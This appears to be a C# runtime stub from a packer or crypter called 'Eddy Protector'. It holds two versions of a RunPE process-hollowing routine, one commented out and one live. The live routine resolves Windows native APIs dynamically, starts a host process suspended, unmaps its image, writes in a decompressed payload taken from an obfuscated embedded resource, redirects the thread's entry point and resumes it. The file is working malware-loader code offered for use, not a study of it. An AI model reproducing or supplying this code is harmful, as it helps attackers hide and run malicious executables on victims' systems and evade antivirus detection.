using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Reflection;
using System.Windows.Forms;

namespace Eddy_Protector_Runtime.Runtime
{


 internal static class PrePacker
 {
  //internal static unsafe class RunPE
  //{
  // public static bool Run(byte[] exeBuffer, string hostProcess)
  // {

  //  string optionalArguments = "";
  //  byte[] IMAGE_SECTION_HEADER = new byte[0x28]; // pish
  //  byte[] IMAGE_NT_HEADERS = new byte[0xf8]; // pinh
  //  byte[] IMAGE_DOS_HEADER = new byte[0x40]; // pidh
  //  int[] PROCESS_INFO = new int[0x4]; // pi
  //  byte[] CONTEXT = new byte[0x2cc]; // ctx

  //  byte* pish;
  //  fixed (byte* p = &IMAGE_SECTION_HEADER[0])
  //      pish = p;

  //  byte* pinh;
  //  fixed (byte* p = &IMAGE_NT_HEADERS[0])
  //      pinh = p;

  //  byte* pidh;
  //  fixed (byte* p = &IMAGE_DOS_HEADER[0])
  //      pidh = p;

  //  byte* ctx;
  //  fixed (byte* p = &CONTEXT[0])
  //      ctx = p;

  //  // Set the flag.
  //  *(uint*)(ctx + 0x0 /* ContextFlags */) = CONTEXT_FULL;

  //  // Get the DOS header of the EXE.
  //  Buffer.BlockCopy(exeBuffer, 0, IMAGE_DOS_HEADER, 0, IMAGE_DOS_HEADER.Length);

  //  /* Sanity check:  See if we have MZ header. */
  //  if (*(ushort*)(pidh + 0x0 /* e_magic */) != IMAGE_DOS_SIGNATURE)
  //   return false;

  //  int e_lfanew = *(int*)(pidh + 0x3c);

  //  // Get the NT header of the EXE.
  //  Buffer.BlockCopy(exeBuffer, e_lfanew, IMAGE_NT_HEADERS, 0, IMAGE_NT_HEADERS.Length);

  //  /* Sanity check: See if we have PE00 header. */
  //  if (*(uint*)(pinh + 0x0 /* Signature */) != IMAGE_NT_SIGNATURE)
  //   return false;

  //  // Run with parameters if necessary.
  //  if (!string.IsNullOrEmpty(optionalArguments))
  //   hostProcess += " " + optionalArguments;

  //  if (!CreateProcess(null, hostProcess, IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, new byte[0x64], PROCESS_INFO))
  //   return false;

  //  IntPtr ImageBase = new IntPtr(*(int*)(pinh + 0x34));
  //  NtUnmapViewOfSection((IntPtr)PROCESS_INFO[0] /* pi.hProcess */, ImageBase);
  //  if (VirtualAllocEx((IntPtr)PROCESS_INFO[0] /* pi.hProcess */, ImageBase, *(uint*)(pinh + 0x50 /* SizeOfImage */), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) == IntPtr.Zero)
  //   Run(exeBuffer, hostProcess); // Memory allocation failed; try again (this can happen in low memory situations)

  //  fixed (byte* p = &exeBuffer[0])
  //      NtWriteVirtualMemory((IntPtr)PROCESS_INFO[0] /* pi.hProcess */, ImageBase, (IntPtr)p, *(uint*)(pinh + 84 /* SizeOfHeaders */), IntPtr.Zero);

  //  for (ushort i = 0; i < *(ushort*)(pinh + 0x6 /* NumberOfSections */); i++)
  //  {
  //   Buffer.BlockCopy(exeBuffer, e_lfanew + IMAGE_NT_HEADERS.Length + (IMAGE_SECTION_HEADER.Length * i), IMAGE_SECTION_HEADER, 0, IMAGE_SECTION_HEADER.Length);
  //   fixed (byte* p = &exeBuffer[*(uint*)(pish + 0x14 /* PointerToRawData */)])
  //       NtWriteVirtualMemory((IntPtr)PROCESS_INFO[0] /* pi.hProcess */, (IntPtr)((int)ImageBase + *(uint*)(pish + 0xc /* VirtualAddress */)), (IntPtr)p, *(uint*)(pish + 0x10 /* SizeOfRawData */), IntPtr.Zero);
  //  }

  //  NtGetContextThread((IntPtr)PROCESS_INFO[1] /* pi.hThread */, (IntPtr)ctx);

  //  IntPtr address = Marshal.AllocHGlobal(4);

  //  Marshal.Copy(BitConverter.GetBytes(ImageBase.ToInt32()), 0, address, 4);

  //  NtWriteVirtualMemory((IntPtr)PROCESS_INFO[0] /* pi.hProcess */, (IntPtr)((*((uint*)(ctx + (164)))) + 8), (IntPtr)(address), 0x4, IntPtr.Zero);

  //  *(uint*)(ctx + 0xB0/* eax */) = (uint)ImageBase + *(uint*)(pinh + 0x28 /* AddressOfEntryPoint */);
  //  NtSetContextThread((IntPtr)PROCESS_INFO[1] /* pi.hThread */, (IntPtr)ctx);

  //  //MessageBox.Show(err.ToString("X"));

  //  NtResumeThread((IntPtr)PROCESS_INFO[1] /* pi.hThread */, IntPtr.Zero);


  //  return true;
  // }



  // private const uint CONTEXT_FULL = 0x10007;
  // private const int CREATE_SUSPENDED = 0x4;
  // private const int MEM_COMMIT = 0x1000;
  // private const int MEM_RESERVE = 0x2000;
  // private const int PAGE_EXECUTE_READWRITE = 0x40;
  // private const ushort IMAGE_DOS_SIGNATURE = 0x5A4D; // MZ
  // private const uint IMAGE_NT_SIGNATURE = 0x00004550; // PE00


  // [DllImport("kernel32.dll", SetLastError = true)]
  // private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, byte[] lpStartupInfo, int[] lpProcessInfo);

  // [DllImport("kernel32.dll", SetLastError = true)]
  // private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

  // [DllImport("ntdll.dll", SetLastError = true)]
  // private static extern uint NtUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);

  // [DllImport("ntdll.dll", SetLastError = true)]
  // private static extern int NtWriteVirtualMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, IntPtr lpNumberOfBytesWritten);

  // [DllImport("ntdll.dll", SetLastError = true)]
  // private static extern int NtGetContextThread(IntPtr hThread, IntPtr lpContext);

  // [DllImport("ntdll.dll", SetLastError = true)]
  // private static extern int NtSetContextThread(IntPtr hThread, IntPtr lpContext);

  // [DllImport("ntdll.dll", SetLastError = true)]
  // private static extern uint NtResumeThread(IntPtr hThread, IntPtr SuspendCount);

  //}

  internal static unsafe class RunPE
  {
   public struct INFO
   {

    public delegate bool CreateProcessW(string app, string cmd, IntPtr PTA, IntPtr thrAttr, [MarshalAs(UnmanagedType.Bool)]bool inherit, int creation, IntPtr env, string curDir, byte[] sI, IntPtr[] pI);
    public delegate bool NtGetContextThread(IntPtr hThr, System.UInt32[] Context);
    public delegate uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);
    public delegate bool NtReadVirtualMemory(IntPtr hProc, IntPtr baseAddr, ref IntPtr bufr, int bufrSS, ref IntPtr numRead);
    public delegate uint NtResumeThread(IntPtr hThread, IntPtr SC);
    public delegate bool NtSetContextThread(IntPtr hThr, System.UInt32[] Context);
    public delegate IntPtr VirtualAllocEx(IntPtr hProc, IntPtr addr, IntPtr SS, int allocType, int prot);
    public delegate bool NtWriteVirtualMemory(IntPtr hProcess, IntPtr VABA, byte[] buff, System.UInt32 nSS, int NOBW);

    [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
    public static extern IntPtr LoadLibrary(string lpFileName);
   }

   public static void RUN(byte[] Byte, string InjHost)
   {
    try
    {

     IntPtr KernelAddr = INFO.LoadLibrary("kernel32");
     IntPtr ntAddr = INFO.LoadLibrary("ntdll");
     GCHandle hAlloc = GCHandle.Alloc(Byte, GCHandleType.Pinned);
     IntPtr hModuleBase = hAlloc.AddrOfPinnedObject();
     hAlloc.Free();
     IntPtr[] PI = new IntPtr[4];
     byte[] SI = new byte[68];
     IntPtr IB = (IntPtr)0;
     uint[] bContext = new uint[179];
     bContext[0x0] = 0x10002;
     IntPtr addr = INFO.GetProcAddress(KernelAddr, "CreateProcessA");
     INFO.CreateProcessW iC = (INFO.CreateProcessW)Marshal.GetDelegateForFunctionPointer(addr, typeof(INFO.CreateProcessW));
     iC(null, InjHost, IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, SI, PI);
     IntPtr lRes = (IntPtr)0;
     IntPtr nb = (IntPtr)0x0;
     addr = INFO.GetProcAddress(ntAddr, "NtReadVirtualMemory");
     INFO.NtReadVirtualMemory ntRv = (INFO.NtReadVirtualMemory)Marshal.GetDelegateForFunctionPointer(addr, typeof(INFO.NtReadVirtualMemory));
     ntRv(Process.GetCurrentProcess().Handle, (IntPtr)(hModuleBase.ToInt32() + 0x3c), ref lRes, 0x4, ref nb);
     int PE = (hModuleBase.ToInt32() + lRes.ToInt32());
     ntRv(Process.GetCurrentProcess().Handle, (IntPtr)(PE + 0x34), ref lRes, 0x4, ref nb);
     IB = lRes;
     addr = INFO.GetProcAddress(ntAddr, "NtUnmapViewOfSection");
     INFO.NtUnmapViewOfSection ntU = (INFO.NtUnmapViewOfSection)Marshal.GetDelegateForFunctionPointer(addr, typeof(INFO.NtUnmapViewOfSection));
     ntU(PI[0x0], IB);
     addr = INFO.GetProcAddress(KernelAddr, "VirtualAllocEx");
     INFO.VirtualAllocEx Vir = (INFO.VirtualAllocEx)Marshal.GetDelegateForFunctionPointer(addr, typeof(INFO.VirtualAllocEx));
     ntRv(Process.GetCurrentProcess().Handle, (IntPtr)(PE + 0x50), ref lRes, 0x4, ref nb);
     IntPtr Virtual = Vir(PI[0x0], IB, lRes, 0x3000, 0x40);
     IntPtr laddr = new IntPtr(BitConverter.ToInt32(Byte, BitConverter.ToInt32(Byte, 0x3c) + 0x34));
     IntPtr nAddr = new IntPtr(BitConverter.ToInt32(Byte, BitConverter.ToInt32(Byte, 0x3c) + 0x50));
     addr = INFO.GetProcAddress(ntAddr, "NtWriteVirtualMemory");
     INFO.NtWriteVirtualMemory ntW = (INFO.NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(addr, typeof(INFO.NtWriteVirtualMemory));
     ntRv(Process.GetCurrentProcess().Handle, (IntPtr)(PE + 0x54), ref lRes, 0x4, ref nb);
     ntW(PI[0x0], Virtual, Byte, (uint)(lRes).ToInt32(), 0x0);

     int[] dData = new int[10];
     byte[] SectionData = null;
     ntRv(Process.GetCurrentProcess().Handle, (IntPtr)(PE + 0x6), ref lRes, 0x2, ref nb);
     for (int i = 0x0; i <= (lRes.ToInt32() - 0x1); i++)
     {
      Buffer.BlockCopy(Byte, (BitConverter.ToInt32(Byte, 0x3c) + 0xf8) + (i * 0x28), dData, 0x0, 0x28);
      SectionData = new byte[(dData[0x4] - 0x1) + 1];
      Buffer.BlockCopy(Byte, dData[0x5], SectionData, 0x0, SectionData.Length);
      nAddr = new IntPtr(Virtual.ToInt32() + dData[0x3]);
      laddr = new IntPtr(SectionData.Length);
      ntW(PI[0x0], nAddr, SectionData, (uint)(laddr), 0x0);
     }
     addr = INFO.GetProcAddress(ntAddr, "NtGetContextThread");
     INFO.NtGetContextThread ntG = (INFO.NtGetContextThread)Marshal.GetDelegateForFunctionPointer(addr, typeof(INFO.NtGetContextThread));
     ntG(PI[0x1], bContext);
     ntW(PI[0x0], (IntPtr)(bContext[0x29] + Convert.ToUInt32(0x8)), BitConverter.GetBytes(Virtual.ToInt32()), Convert.ToUInt32(0x4), 0x0);
     ntRv(Process.GetCurrentProcess().Handle, (IntPtr)(PE + 0x28), ref lRes, 0x4, ref nb);
     bContext[0x2c] = (uint)(IB.ToInt32() + lRes.ToInt32());
     addr = INFO.GetProcAddress(ntAddr, "NtSetContextThread");
     INFO.NtSetContextThread ntS = (INFO.NtSetContextThread)Marshal.GetDelegateForFunctionPointer(addr, typeof(INFO.NtSetContextThread));
     ntS(PI[0x1], bContext);
     addr = INFO.GetProcAddress(ntAddr, "NtResumeThread");
     INFO.NtResumeThread ntR = (INFO.NtResumeThread)Marshal.GetDelegateForFunctionPointer(addr, typeof(INFO.NtResumeThread));
     ntR(PI[0x1], (IntPtr)(0x0));
    }
    catch (Exception ex)
    {
     MessageBox.Show(ex.Message);
    }
   }

  }

  public static void Main(string[] args)
  {
   try
   {
    RunPE.RUN(GetData(), Application.ExecutablePath);
   }
   catch
   {
    Process.GetCurrentProcess().Kill();
   }

  }

  private static byte[] GetData()
  {
   byte[] result = null;
   Stream stub = Assembly.GetExecutingAssembly().GetManifestResourceStream(Encoding.BigEndianUnicode.GetString(SHA1.Create().ComputeHash(BitConverter.GetBytes(Mutation.KeyI0))));

   if (stub.Length != 0)
   {
    result = new byte[stub.Length];
    stub.Read(result, 0, result.Length);
   }
   return Lzma.Decompress(result);
  }

 }
}
